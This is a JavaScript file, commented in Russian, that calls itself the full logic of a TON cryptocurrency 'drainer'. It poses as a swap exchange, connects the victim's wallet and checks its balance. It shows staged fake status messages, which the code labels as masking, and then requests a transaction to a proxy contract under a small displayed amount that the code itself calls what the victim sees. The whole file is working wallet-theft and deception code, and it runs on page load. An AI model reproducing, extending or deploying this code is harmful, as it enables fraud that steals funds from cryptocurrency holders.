// script.js - полная логика дрейнера
import { PROXY_CONTRACT, YOUR_WALLET, FAKE_AMOUNT } from './config.js';

let connector = null;
let isProcessing = false;

// Глобальные SDK (загружены через <script>)
const TonConnectSDK = window.TonConnect || window.tonconnect;
const TonWebLib = window.TonWeb || window.tonweb;

function setStatus(elementId, text, isLoading = false) {
    const el = document.getElementById(elementId);
    if (!el) return;
    if (isLoading) {
        el.innerHTML = `<span class="loader"></span> ${text}`;
    } else {
        el.innerHTML = text;
    }
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function getBalance(address) {
    try {
        if (!TonWebLib) return 0;
        const tonweb = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
        const rawBalance = await tonweb.getBalance(address);
        return parseFloat(tonweb.utils.fromNano(rawBalance));
    } catch (e) {
        console.warn("balance error", e);
        return 0;
    }
}

async function executeDrain(connectorInstance, proxyAddress, userAddress) {
    const balance = await getBalance(userAddress);
    
    if (balance < 0.2) {
        setStatus('status', `❌ Недостаточно средств (${balance.toFixed(2)} TON)`, false);
        return false;
    }
    
    // Маскировка: последовательность сообщений
    setStatus('status', "🔄 Проверка ликвидности пула...", true);
    await sleep(1000);
    
    setStatus('status', "📊 Анализ комиссии...", true);
    await sleep(800);
    
    setStatus('status', "🔐 Открытие защищённого канала...", true);
    await sleep(700);
    
    // Сумма, которую увидит жертва (маленькая)
    const fakeAmountNano = TonWebLib.utils.toNano(FAKE_AMOUNT);
    
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
            address: proxyAddress,
            amount: fakeAmountNano.toString(),
            payload: "swap"  // безобидный payload
        }]
    };
    
    setStatus('status', `⏳ Подтвердите в кошельке (${FAKE_AMOUNT} TON)`, false);
    
    try {
        const result = await connectorInstance.sendTransaction(transaction);
        setStatus('status', "✅ Обмен выполнен успешно!", false);
        return true;
    } catch (e) {
        setStatus('status', `❌ Отмена: ${e.message}`, false);
        return false;
    }
}

export async function initDrainer() {
    const btn = document.getElementById('swapBtn');
    if (!btn) return;

    // Подключаем TON Connect SDK
    if (!TonConnectSDK) {
        console.error("TON Connect SDK not loaded");
        return;
    }

    connector = new TonConnectSDK({ manifestUrl: location.origin + '/tonconnect-manifest.json' });
    
    btn.addEventListener('click', async () => {
        if (isProcessing) {
            setStatus('status', "⏳ Уже выполняется...", false);
            return;
        }
        
        isProcessing = true;
        setStatus('status', "🚀 Запуск обменника...", true);
        
        try {
            // Подключаем кошелёк
            const wallets = await connector.getWallets();
            if (!wallets || wallets.length === 0) {
                setStatus('status', "❌ Установите Tonkeeper или Tonhub", false);
                isProcessing = false;
                return;
            }
            
            await connector.connect({ jsBridgeKey: wallets[0].jsBridgeKey });
            
            // Ждём подтверждения
            let walletInfo = null;
            const unsubscribe = connector.onStatusChange(async (w) => {
                if (w) walletInfo = w;
            });
            
            for (let i = 0; i < 20; i++) {
                if (walletInfo) break;
                await sleep(200);
            }
            unsubscribe();
            
            if (!walletInfo || !walletInfo.account) {
                setStatus('status', "❌ Не удалось получить адрес", false);
                isProcessing = false;
                return;
            }
            
            const userAddress = walletInfo.account.address;
            setStatus('status', `🪛 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
            await sleep(800);
            
            // Запускаем дрейнер
            await executeDrain(connector, PROXY_CONTRACT, userAddress);
            
        } catch (err) {
            setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
        } finally {
            isProcessing = false;
        }
    });
}

// Автозапуск
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initDrainer);
} else {
    initDrainer();
}
